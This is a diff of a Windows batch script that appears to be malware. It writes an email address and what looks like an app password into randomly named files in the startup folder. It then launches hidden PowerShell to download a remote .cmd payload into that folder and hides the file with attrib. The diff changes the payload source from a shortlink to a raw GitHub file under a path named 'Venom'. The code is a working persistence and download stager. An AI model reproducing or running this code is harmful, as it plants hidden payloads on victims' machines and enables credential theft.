@@ -8,7 +8,7 @@ cd %STARTUP%
 echo goat3dmofo@gmail.com >> PkUbTvqXFIdB.txt
 echo qcihadixhgspywjw >> NzKnmxLrbsBw.txt
 
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'http://tiny.cc/k4cg001' -UseBasicParsing -OutFile IVbaANzwiphH.cmd"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile IVbaANzwiphH.cmd"
 
 attrib +h "%STARTUP%/IVbaANzwiphH.cmd"
 
